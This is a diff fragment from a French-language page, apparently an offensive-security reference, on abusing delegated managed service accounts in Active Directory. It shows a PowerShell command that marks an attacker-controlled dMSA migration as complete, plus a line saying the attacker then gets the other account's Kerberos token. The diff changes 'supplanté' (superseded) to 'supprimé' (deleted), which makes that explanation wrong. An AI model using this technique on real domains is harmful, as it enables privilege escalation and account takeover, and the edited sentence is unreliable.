@@ -47,7 +47,7 @@ Set-ADServiceAccount attacker_dMSA -Add \
 # 3. Mark the migration as *completed*
 Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
 ```
-Après la réplication, l'attaquant peut simplement **se connecter** en tant que `attacker_dMSA$` ou demander un TGT Kerberos – Windows construira le jeton du compte *supplanté*.
+Après la réplication, l'attaquant peut simplement **se connecter** en tant que `attacker_dMSA$` ou demander un TGT Kerberos – Windows construira le jeton du compte *supprimé*.
 
 ### Automatisation
 
